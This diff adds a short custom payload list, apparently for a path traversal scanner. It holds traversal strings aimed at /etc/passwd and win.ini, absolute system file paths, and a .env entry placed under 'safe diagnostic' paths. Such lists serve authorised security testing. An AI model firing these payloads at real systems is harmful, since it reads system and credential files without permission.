@@ -1,0 +1,23 @@
+# ===================================================================
+# Custom Payloads & Test Paths
+# Add your custom test cases here (one per line).
+# Lines starting with '#' and blank lines are ignored.
+# ===================================================================
+
+# Standard traversal test vectors
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+..\\..\\..\\windows\\win.ini
+..\\..\\..\\..\\windows\\win.ini
+
+# Common absolute file paths
+/etc/passwd
+/etc/hosts
+C:\Windows\win.ini
+
+# Safe diagnostic / local application paths
+index.php
+robots.txt
+sitemap.xml
+.env
